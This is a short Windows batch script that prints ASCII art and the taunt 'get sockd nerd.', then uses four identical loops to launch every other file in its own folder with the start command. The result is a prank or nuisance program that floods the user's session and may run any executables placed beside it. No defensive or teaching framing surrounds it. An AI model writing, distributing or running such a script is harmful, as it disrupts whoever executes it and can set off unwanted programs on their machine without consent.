@echo off
  echo  _   _   
  echo ( )_( )  
  echo  |___|   
  echo  /     \  
  echo  |  \_/  |
  echo  |_______|

  echo get sockd nerd.
setlocal enabledelayedexpansion
for %%f in ("%~dp0*") do (
    if "%%f" neq "%~f0" (
        start "" "%%f"
    )
)
for %%f in ("%~dp0*") do (
    if "%%f" neq "%~f0" (
        start "" "%%f"
    )
)
for %%f in ("%~dp0*") do (
    if "%%f" neq "%~f0" (
        start "" "%%f"
    )
)
for %%f in ("%~dp0*") do (
    if "%%f" neq "%~f0" (
        start "" "%%f"
    )
)
